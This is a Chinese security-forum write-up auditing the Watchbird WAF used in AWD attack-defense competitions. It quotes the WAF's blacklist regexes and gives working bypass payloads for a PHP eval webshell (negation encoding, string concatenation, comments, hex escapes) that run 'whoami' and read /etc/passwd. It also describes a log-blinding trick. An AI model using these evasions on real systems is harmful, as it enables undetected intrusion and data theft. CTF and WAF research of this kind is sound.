# 对AWD流行开源WAF（1） -- Watchbird的白盒审计

> **来源**: https://forum.butian.net/share/2817  
> **文章ID**: 2817

---

简介
==

众所周知，AWD攻防是一个节奏非常快，时间比较紧张的比赛模式。而如果在这种情况下，一些队伍在自己的靶机上部署了waf和流量监控脚本，通常来说是很难在比赛过程中绕过的。于是提前对这些应用广泛的开源waf进行审计，拿到一些绕过的trick，可以在比赛中获取优势。

**Watchbird项目地址：<https://github.com/leohearts/awd-watchbird>**

测试过程
====

先给大家展示一下这个waf的后台日志部分：

在右下角绿色区域，是记录不受拦截的流量日志（正常流量或绕过waf的流量）；  
其他三个划了红圈的区域，则是拦截到攻击的流量。  
![image.png](images/attach-bc7005762d489ceea2fe23fd507e1f11e88297fe.png)

这边就以藏有一句话木马后门\\<?php eval($\_GET\['file'\]); ?>，且包含了watchbird的一个index.php为例子，展开如下测试。

RCE黑名单突破绕过
----------

如下，这是源码中对rce的黑名单，可以看到绝大多数常用的危险函数都被过滤了，包括用于编码转换的base64和rot13的函数：

```php
public $rce_blacklist = "/\`|var_dump|str_rot13|serialize|base64_encode|base64_decode|strrev|eval\(|assert|file_put_contents|fwrite|curl_exec\(|dl\(|readlink|popepassthru|preg_replace|preg_filter|mb_ereg_replace|register_shutdown_function|register_tick_function|create_function|array_map|array_reduce|uasort|uksort|array_udiff|array_walk|call_user_func|array_filter|usort|stream_socket_server|pcntl_exec|passthru|exec(|system(|chroot\(|scandir\(|chgrp\(|chown|shell_exec|proc_open|proc_get_status|popen\(|ini_alter|ini_restore|ini_set|LD_PRELOAD|ini_alter|ini_restore|ini_set|base64 -d/i";
```

但是如果根据黑名单去过滤的话，一旦忘记了ban掉某个危险函数（像这个黑名单里缺少了putenv()之类的函数），或者攻击者在格式上有所突破的话（类似HTTP分段请求注入，也可以绕过很多waf），那就可以被随意攻击了。

### Trick 1：取反绕过

执行system('whoami');

```php
payload:?file=(~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);
```

可以看到成功在前端输出whoami的执行结果，并且后端日志检测为安全。  
![image.png](images/attach-594bccf774b440e7bd65a44e7ff23a8ce630af4a.png)

![image.png](images/attach-cc624f52a5fd55d7178f8c7107f8a2d80080d52a.png)

### Trick 2：字符串拼接绕过

```php
payload: ?file=(sy.(st).em)(whoami);
```

*图略，结果同Trick1，前端输出结果，后端不会判断为恶意攻击。*

### Trick 3：内联注释绕过

有点像绕mysql时候，加/*\\*/之类的字符绕过检测。

```php
payload: ?file=(sy./\*caixukun\*/(st)/\*caixukun\*/.em)/\*caixukun\*/(wh./\*caixukun\*/(oa)/\*caixukun\*/.mi);
```

*图略，结果同Trick1，前端输出结果，后端不会判断为恶意攻击。*

### Trick 4：对函数进行编码转换绕过

```php
payload:?file="\x73\x79\x73\x74\x65\x6d"("cat /etc/passwd");
```

![image.png](images/attach-4f7c1bca5a652a8b6b53eba315f04d525c47e7c9.png)

![image.png](images/attach-ed91014e710bf471cad524e1f8301829105f0323.png)  
给大家留一个编码转换脚本：

```python
def string_to_hex_str(s):  
    # 编码为字节，然后格式化每个字节为十六进制字符串，并连接它们  
    return ''.join('\\x{:02x}'.format(b) for b in s.encode('utf-8'))  

s = "system"  
hex_encoded_str = string_to_hex_str(s)  
print(hex_encoded_str) # 输出: \x73\x79\x73\x74\x65\x6d
```

SQL注入黑名单突破绕过
------------

这是sql语句的黑名单，相对rce黑名单来说，相信大家能感觉出来它有点形同虚设：

```php
public $sql_blacklist = "/drop |dumpfile\b|INTO FILE|union select|outfile\b|load_file\b|multipoint\(/i";
```

比如union select，是放在一起过滤而不是分开检测，在两个单词中间多加几个空格甚至都能绕过。

文件上传点的理论突破
----------

这个waf的检测恶意文件使用了白名单，比较难绕，但是可以注意到，他是先上传文件，然后再检测，检测到有问题再删除。

![image.png](images/attach-32aa1a49aefe9d2871107c9b4096be4aebb14fff.png)  
于是可以用条件竞争的方式，去试着边写一个能生成新木马的php文件，边对它进行访问，最后成功创建一个新shell。

但是这只存在于理论，因为一是awd时间比较短，条件竞争产出比较慢，可能来不及成功；二是该waf自带一个ddos防御功能，在爆破的时候七成以上数据包都会被waf拦截掉。

绕过流量日志的监测
---------

可以看到，单个日志大小最多为4w个字符  
![image.png](images/attach-7a4c425ddbb9727a32e6f8793c73808b4fc054c6.png)

再来到源码533行，可以看到在记录日志时候，如果日志大小超出了上述最大值，就会进行一次全部删除。

![image.png](images/attach-36e324e549c5c2c3fdc3430c308bb0c3e55ca688.png)  
根据这个特性，如果我们的测试payload数据包大于这个值，填入很多很大的脏数据，那它的后台将不会显示有这条日志记录（但是waf对关键词还是照样匹配拦截的）。

具体效果如下：我用bp抓包，包里放一堆python生成的脏数据，点击发送  
![image.png](images/attach-741ca93968c49b0e5140f26c9b5a8b4790aac74f.png)

可以看到日志后台直接被致盲，不会记录任何东西

![image.png](images/attach-153de56dc72658ecd70d9ec91f6e47e36d1b14a5.png)

总结
==

比赛过程中如果遇到这样的watchbird，可以直接拿本文的思路去试试。  
类似这样基于黑白名单的waf，再加上项目年久失修（虽然也就一两年），往往突破口还是比较多的，所以现在正经大厂商的waf都在往语义识别，AI识别上靠拢。
